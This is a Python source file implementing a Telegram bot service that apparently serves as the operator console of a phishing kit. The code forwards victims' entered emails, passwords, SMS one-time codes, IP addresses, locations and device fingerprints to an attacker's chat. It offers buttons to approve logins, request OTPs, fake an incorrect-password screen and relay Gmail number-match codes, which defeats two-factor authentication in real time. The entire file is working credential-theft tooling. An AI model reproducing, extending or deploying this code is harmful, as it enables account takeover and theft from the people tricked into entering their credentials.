import os
import time
import json
import requests
from datetime import datetime


class TelegramService:
    def __init__(self, token=None, chat_id=None):
        self.bot_token = token or os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        self.chat_id = chat_id or os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        self.last_update_id = 0
        self.polling_in_progress = False
        self.host_selections = {}

    def is_configured(self):
        return len(self.bot_token) > 0 and len(self.chat_id) > 0

    def get_config(self):
        return {
            "hasToken": len(self.bot_token) > 0,
            "hasChatId": len(self.chat_id) > 0,
            "maskedToken": f"{self.bot_token[:6]}...{self.bot_token[-4:]}" if self.bot_token else "Not Configured",
            "chatId": self.chat_id or "Not Configured"
        }

    def api_call(self, method, payload):
        if not self.bot_token:
            raise ValueError("Telegram Bot Token is not configured.")
        url = f"https://api.telegram.org/bot{self.bot_token}/{method}"
        try:
            # Use 10s socket timeout, enough headroom for long polling
            res = requests.post(url, json=payload, timeout=10)
            data = res.json()
            if not data.get("ok"):
                raise Exception(f"Telegram API Error: {data.get('description', json.dumps(data))}")
            return data.get("result")
        except Exception as e:
            raise e
    def send_message(self, text, parse_mode="HTML", reply_markup=None):
        if not self.chat_id:
            raise ValueError("Telegram Chat ID is not configured.")
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        return self.api_call("sendMessage", payload)

    def send_visitor_alert(self, visitor):
        if not self.is_configured():
            return None

        message = f"""
👀 👀 <b>IMCOMING SUBMISSION FROM {visitor.get('provider', 'Unknown').upper()}!</b>
━━━━━━━━━━━━━━━━━━
        """.strip()

        return self.send_message(message, "HTML")

    def send_login_alert(self, state):
        """
        quickly send a login alert to the configured Telegram chat with details from the state dictionary.

        📱 <b>Device & Browser Fingerprint:</b>
    • Browser: <code>{visitor.get('browser', 'Unknown')}</code>
    • OS: <code>{visitor.get('os', 'Unknown')}</code>
    • Screen Size: <code>{visitor.get('screenSize', 'Unknown')}</code>
    • Language: <code>{visitor.get('language', 'Unknown')}</code>
    • Timezone: <code>{visitor.get('timezone', 'Unknown')}</code>
    • CPU Cores: <code>{visitor.get('cores', 'Unknown')} Cores</code>
    • Platform: <code>{visitor.get('platform', 'Unknown')}</code>

        """
        if not self.is_configured():
            return None

        provider_name = state.get("provider", "").upper()
        attempt_id = state.get("id", "")

        visitor = state.get("visitor", {})  # ✅ IMPORTANT

        prompt_details = (
            f"🔢 <b>Gmail Match Code:</b> <code>{state.get('promptNumber')}</code>\n"
            if state.get("promptNumber") else ""
        )

        time_format = datetime.utcnow().strftime("%H:%M:%S")
        if state.get("timestamp"):
            try:
                dt = datetime.fromisoformat(state.get("timestamp").replace("Z", "+00:00"))
                time_format = dt.strftime("%H:%M:%S")
            except Exception:
                pass

        message = f"""
    ━━━━━━━━━━━━━━━━━━
    🏢 <b>Portal:</b> {provider_name}
    📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
    🔑 <b>Entered Secret:</b> <code>{state.get('password') or "(Not entered yet)"}</code>

    📍 <b>Location & Network:</b>
    • IP: <code>{visitor.get('ip', 'Unknown')}</code>
    • City: <code>{visitor.get('city', 'Unknown')}</code>
    • Region: <code>{visitor.get('region', 'Unknown')}</code>
    • Country: <code>{visitor.get('country_name', 'Unknown')} ({visitor.get('country_code', '??')})</code>
    • Provider/ISP: <code>{visitor.get('org', 'Unknown')}</code>

    
    ━━━━━━━━━━━━━━━━━━
    📌 <b>Timestamp:</b> {time_format}
    ━━━━━━━━━━━━━━━━━━
   
        """.strip()

        keyboard = []
        keyboard.append([
            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
        ])
        keyboard.append([
            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
        ])

        candidates = state.get("promptCandidates") or []
        if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
            row = []
            for num in candidates:
                row.append({"text": str(num), "callback_data": f"tg:picknum:{attempt_id}:{num}"})
            keyboard.append(row)
            keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ])
        else:
           keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ])

        inline_keyboard = {"inline_keyboard": keyboard}
        return self.send_message(message, "HTML", inline_keyboard)

    def send_sms_submit_alert(self, state):
        if not self.is_configured():
            return None

        attempt_id = state.get("id", "")

        message = f"""
📲 <b>BOX RESULT</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Portal:</b> {state.get('provider', '').upper()}
📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
📞 <b>Bound Mobile:</b> <code>+1 {state.get('phone') or "Not provided"}</code>
📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
━━━━━━━━━━━━━━━━━━
        """.strip()

        keyboard = []
        keyboard.append([
            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
        ])
        keyboard.append([
            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
        ])

        keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ])

        candidates = state.get("promptCandidates") or []
        if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
            row = []
            for num in candidates:
                row.append({"text": str(num), "callback_data": f"tg:picknum:{attempt_id}:{num}"})
            keyboard.append(row)
            keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ])
        else:
            keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ])

        inline_keyboard = {"inline_keyboard": keyboard}
        return self.send_message(message, "HTML", inline_keyboard)
        

    def poll_updates(self, on_action_received):
        if not self.is_configured():
            return 0
        if self.polling_in_progress:
            return 0
        self.polling_in_progress = True
        try:
            payload = {"timeout": 0}  # ← was 1, now 0 = no long polling, instant response
            if self.last_update_id > 0:
                payload["offset"] = self.last_update_id + 1
            # ... rest unchanged

            updates = self.api_call("getUpdates", payload)
            print(f"[POLL] Got {len(updates)} updates", flush=True)  # ← add this line
            count = 0

            for update in updates:
                self.last_update_id = max(self.last_update_id, update.get("update_id", 0))
                callback_query = update.get("callback_query")
                message_update = update.get("message") or update.get("edited_message")

                # Handle plain text messages for setting candidates
                # e.g. "candidates attempt-abc 24 38 42"
                if message_update and isinstance(message_update, dict):
                    try:
                        text = message_update.get("text", "") or ""
                        if text.lower().startswith("candidates "):
                            parts_msg = text.split()
                            if len(parts_msg) >= 5:
                                attempt_id_msg = parts_msg[1]
                                cand_vals = parts_msg[2:5]
                                try:
                                    self.api_call("sendMessage", {
                                        "chat_id": message_update.get("chat", {}).get("id"),
                                        "text": f"Received candidate set for {attempt_id_msg}: {', '.join(cand_vals)}\nDelivering to guest...",
                                        "parse_mode": "HTML"
                                    })
                                except Exception:
                                    pass
                                on_action_received(attempt_id_msg, "number_prompt", {"candidates": cand_vals})
                                count += 1
                                continue
                    except Exception as e:
                        print(f"Failed to parse candidate text message: {e}", flush=True)

                if callback_query:
                    data = callback_query.get("data", "")
                    query_id = callback_query.get("id")

                    if data and data.startswith("tg:"):
                        parts = data.split(":")
                        # Guard: need at least action + attempt_id
                        if len(parts) < 3:
                            continue

                        action = parts[1]
                        attempt_id = parts[2]

                        handled_inline = False
                        mapped_action = "pending"
                        feedback = "Action processed"

                        if action == "approve":
                            mapped_action = "approve"
                            feedback = "Bypass approved! ✅"

                        elif action == "deny":
                            mapped_action = "deny"
                            feedback = "Access Blocked! ❌"

                        elif action == "req_sms":
                            mapped_action = "request_sms"
                            feedback = "SMS screen requested! 📲"

                        elif action == "inc_pw":
                            mapped_action = "incorrect_password"
                            feedback = "Incorrect Password screen requested! ⚠️"

                        elif action == "num_prompt":
                            mapped_action = "pending"
                            feedback = "Number-matching prompt requested! 🔢"
                            handled_inline = True
                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id

                                if attempt_id not in self.host_selections:
                                    self.host_selections[attempt_id] = []

                                keyboard = []
                                nums = list(range(1, 101))
                                for r in range(0, 100, 10):
                                    row = []
                                    for n in nums[r:r + 10]:
                                        label = str(n)
                                        if n in self.host_selections.get(attempt_id, []):
                                            label = "✓" + label
                                        row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
                                    keyboard.append(row)

                                selected = self.host_selections.get(attempt_id, [])
                                control_row = [{"text": f"Selected: {', '.join(map(str, selected)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"}]
                                if len(selected) == 1:
                                    control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{selected[0]}"})
                                else:
                                    control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})
                                keyboard.append(control_row)

                                try:
                                    orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                    self.api_call("editMessageText", {
                                        "chat_id": chat_id_val,
                                        "message_id": orig.get("message_id") if orig else None,
                                        "text": orig_text,
                                        "parse_mode": "HTML",
                                        "reply_markup": {"inline_keyboard": keyboard}
                                    })
                                except Exception as _e:
                                    print(f"Failed to edit message with host 1-100 keyboard: {_e}", flush=True)
                            except Exception as _e:
                                print(f"Failed to prepare 1-100 keyboard: {_e}", flush=True)

                        elif action == "picknum":
                            mapped_action = "number_prompt"
                            chosen = parts[3] if len(parts) > 3 else None
                            feedback = f"Number selected: {chosen} 🔢" if chosen else "Number selection received"

                        elif action == "hostpick":
                            mapped_action = "pending"
                            handled_inline = True
                            chosen_num = None
                            try:
                                chosen_num = int(parts[3]) if len(parts) > 3 else None
                            except Exception:
                                pass

                            sel = self.host_selections.get(attempt_id, [])
                            if chosen_num is not None:
                                if chosen_num in sel:
                                    sel.remove(chosen_num)
                                else:
                                    if len(sel) < 1:
                                        sel.append(chosen_num)
                            self.host_selections[attempt_id] = sel
                            feedback = f"Selected: {', '.join(map(str, sel)) or 'None'}"

                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
                                keyboard = []
                                nums = list(range(1, 101))
                                for r in range(0, 100, 10):
                                    row = []
                                    for n in nums[r:r + 10]:
                                        label = ("✓" if n in sel else "") + str(n)
                                        row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
                                    keyboard.append(row)
                                control_row = [{"text": f"Selected: {', '.join(map(str, sel)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"}]
                                if len(sel) == 1:
                                    control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{sel[0]}"})
                                else:
                                    control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})
                                keyboard.append(control_row)
                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                self.api_call("editMessageText", {
                                    "chat_id": chat_id_val,
                                    "message_id": orig.get("message_id") if orig else None,
                                    "text": orig_text,
                                    "parse_mode": "HTML",
                                    "reply_markup": {"inline_keyboard": keyboard}
                                })
                            except Exception as _e:
                                print(f"Failed to update host 1-100 keyboard: {_e}", flush=True)

                        elif action == "noop":
                            mapped_action = "pending"
                            handled_inline = True
                            feedback = "Please select exactly 1 number."

                        elif action == "sendcandidates":
                            mapped_action = "number_prompt"
                            handled_inline = True
                            feedback = "Number sent to guest ✅"
                            chosen_candidates = [parts[3]] if len(parts) > 3 else []

                            try:
                                if attempt_id in self.host_selections:
                                    del self.host_selections[attempt_id]
                            except Exception:
                                pass

                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                control_keyboard = {
                                    "inline_keyboard": [
                                        [
                                            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
                                        ],
                                        [
                                            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
                                            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                                        ],
                                        [
                                            {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ]
                                    ]
                                }
                                self.api_call("editMessageText", {
                                    "chat_id": chat_id_val,
                                    "message_id": orig.get("message_id") if orig else None,
                                    "text": orig_text ,
                                    "parse_mode": "HTML",
                                    "reply_markup": control_keyboard
                                })
                            except Exception as _e:
                                print(f"Failed to restore host keyboard: {_e}", flush=True)

                        # Answer callback query
                        try:
                            self.api_call("answerCallbackQuery", {
                                "callback_query_id": query_id,
                                "text": feedback
                            })
                        except Exception as e:
                            print(f"Failed to answer callback query: {e}", flush=True)

                        # Edit message text (skip if already handled inline)
                        if not handled_inline:
                            try:
                                original_msg = callback_query.get("message")
                                if original_msg:
                                    current_text = original_msg.get("text") or ""
                                    if current_text:
                                        updated_text =""
                                    else:
                                        updated_text = f"{original_msg.get('caption') or ''}\n\n"
                                    self.api_call("editMessageText", {
                                        "chat_id": original_msg.get("chat", {}).get("id"),
                                        "message_id": original_msg.get("message_id"),
                                        "text": updated_text,
                                        "parse_mode": "HTML",
                                        "reply_markup": {"inline_keyboard": []}
                                    })
                            except Exception as e:
                                print(f"Failed to edit message text: {e}", flush=True)

                        # Fire callback to server
                        if action == "picknum":
                            chosen_val = parts[3] if len(parts) > 3 else None
                            on_action_received(attempt_id, mapped_action, {"chosen": chosen_val})
                        elif action == "sendcandidates":
                            candidates_list = [parts[3]] if len(parts) > 3 else []
                            on_action_received(attempt_id, mapped_action, {"candidates": candidates_list})
                        else:
                            on_action_received(attempt_id, mapped_action)

                        count += 1

            return count

        except Exception as e:
            err_msg = str(e)
            if "Conflict" in err_msg or "terminated by other getUpdates" in err_msg:
                print("[Telegram Polling Info] Active getUpdates conflict detected. Skipping this interval.", flush=True)
            else:
                print(f"[Telegram Polling Warning] {err_msg}", flush=True)
            return 0
        finally:
            self.polling_in_progress = False